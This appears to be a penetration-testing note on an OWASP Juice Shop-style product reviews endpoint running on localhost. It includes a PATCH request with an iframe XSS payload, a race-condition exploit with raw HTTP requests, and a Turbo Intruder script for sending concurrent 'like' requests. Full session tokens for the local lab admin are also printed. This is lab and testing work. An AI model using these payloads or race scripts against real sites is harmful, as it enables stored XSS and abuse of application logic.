## Description

Update review for a product. 

## Connection Details

HTTP Methods: `GET, PATCH`, `POST`
Parameters: 
- `product`
- `message`
- `author`
- `id`

### Sample Request

```http
PATCH /rest/products/reviews HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:3000/
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjEyNy4wLjAuMSIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0xMi0yMCAwNDo1MzozMC43NzQgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMi0xMi0yMSAwMzowMDo1My4zMDUgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjcxNjEwOTYyLCJleHAiOjE2NzE2Mjg5NjJ9.G80UEEzhy3kMP7kocJx4DRW7VzQthX51glVi_LO-CPeTT1QCvR_E2DAd8BmYOYRTCKlbVYRGWCrxf022Eerd1J5vP2l3AxYyL8arWzz-qdS7Eac5KlrdAJFDUPNetGFwLE7bs_BNjcpaB9DoxdJ5W8VHDGoZ2d6nXzK7aIdfMfo
Content-Type: application/json
Content-Length: 79
Origin: http://localhost:3000
DNT: 1
Connection: close
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=jBP9DR8KAJJtRs9UjHrT8FwfZiySE1foqHJaSQ7Cloh4eCjVsg4AQma64Eyw; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjEyNy4wLjAuMSIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0xMi0yMCAwNDo1MzozMC43NzQgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMi0xMi0yMSAwMzowMDo1My4zMDUgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjcxNjEwOTYyLCJleHAiOjE2NzE2Mjg5NjJ9.G80UEEzhy3kMP7kocJx4DRW7VzQthX51glVi_LO-CPeTT1QCvR_E2DAd8BmYOYRTCKlbVYRGWCrxf022Eerd1J5vP2l3AxYyL8arWzz-qdS7Eac5KlrdAJFDUPNetGFwLE7bs_BNjcpaB9DoxdJ5W8VHDGoZ2d6nXzK7aIdfMfo
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"id":"n75PNeZEj7dR4ANwp","message":"<iframe src=\"javascript:alert(`xss`)\">"}
```

## Patch Parameters 

### `id`
#### Description
ID of the review in question. 

### `message`
#### Description
Content of the review to be updated

## POST Parameters

### `id`
#### Description
ID of the review in question. 

## Vulnerabilities

### Race Condition to like review

#### Exploit
Send multiple request to like a review. 
```http
POST /rest/products/reviews HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:3000/
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjEyNy4wLjAuMSIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0xMi0yMCAwNDo1MzozMC43NzQgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMi0xMi0yMSAwMzowMDo1My4zMDUgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjcxNjEwOTYyLCJleHAiOjE2NzE2Mjg5NjJ9.G80UEEzhy3kMP7kocJx4DRW7VzQthX51glVi_LO-CPeTT1QCvR_E2DAd8BmYOYRTCKlbVYRGWCrxf022Eerd1J5vP2l3AxYyL8arWzz-qdS7Eac5KlrdAJFDUPNetGFwLE7bs_BNjcpaB9DoxdJ5W8VHDGoZ2d6nXzK7aIdfMfo
Content-Type: application/json
Content-Length: 26
Origin: http://localhost:3000
DNT: 1
Connection: keep-alive
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=pPVW213GQVtpsKU4H5ToFLf1iPSqZf7PHxXSOjHkyCvohKZtPXsDV0vk94lK; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjEyNy4wLjAuMSIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0xMi0yMCAwNDo1MzozMC43NzQgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMi0xMi0yMSAwMzowMDo1My4zMDUgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjcxNjEwOTYyLCJleHAiOjE2NzE2Mjg5NjJ9.G80UEEzhy3kMP7kocJx4DRW7VzQthX51glVi_LO-CPeTT1QCvR_E2DAd8BmYOYRTCKlbVYRGWCrxf022Eerd1J5vP2l3AxYyL8arWzz-qdS7Eac5KlrdAJFDUPNetGFwLE7bs_BNjcpaB9DoxdJ5W8VHDGoZ2d6nXzK7aIdfMfo; continueCodeFindIt=kKpMPrPWMomqBlRk9vxX2eV5Qpn8OxiNzALOb6Kz70Y1dwyJGgD3ENja02mz; continueCodeFixIt=K9XqGdOQwBVWm8PJM4eLko9lK7pAXvtQN1qZERy260rYzGbgvXjN35nDlgrP
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin0

{"id":"MMPBrvQoad3Fs2D47"}
```
Turbo Intruder config:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=1,
                           pipeline=False
                           )

    for i in range(3):
        engine.queue(target.req, str(i).rstrip())


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if req.status != 404:
        table.add(req)

```
#### Impact
Same user can like a review multiple times. 

## Possible Attack Vectors

### ?


